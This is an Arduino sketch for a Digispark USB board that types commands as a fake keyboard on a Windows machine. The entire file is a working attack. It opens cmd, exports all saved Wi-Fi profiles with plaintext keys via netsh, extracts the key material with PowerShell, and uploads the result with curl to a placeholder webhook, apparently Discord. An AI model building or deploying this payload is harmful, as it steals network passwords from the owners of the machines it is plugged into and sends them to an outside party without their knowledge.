#include "DigiKeyboard.h"
void setup() {
  pinMode(1, OUTPUT); //LED on Model A
}
void loop() {
  DigiKeyboard.update();
  DigiKeyboard.sendKeyStroke(0);
  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT); //run
  DigiKeyboard.delay(300);
  DigiKeyboard.println("cmd");
  DigiKeyboard.delay(500);
  DigiKeyboard.println("netsh wlan export profile key=clear");
  DigiKeyboard.delay(500);
  DigiKeyboard.println("powershell Select-String -Path Wi-Fi-* -Pattern 'keyMaterial' > wifi");
  DigiKeyboard.delay(500);
  DigiKeyboard.println("curl -i -H \"Expect:application/json\" -F file=@wifi -F \"payload_json={\\\"wait\\\":true,\\\"content\\\":\\\"USERNAME\\\",\\\"JalauddinVECTOR\\\":\\\"passwords\\\"}\" WEBHOOK");
  DigiKeyboard.delay(500);
  DigiKeyboard.println("exit");
  digitalWrite(1, HIGH); //led on
  DigiKeyboard.delay(90000);
}
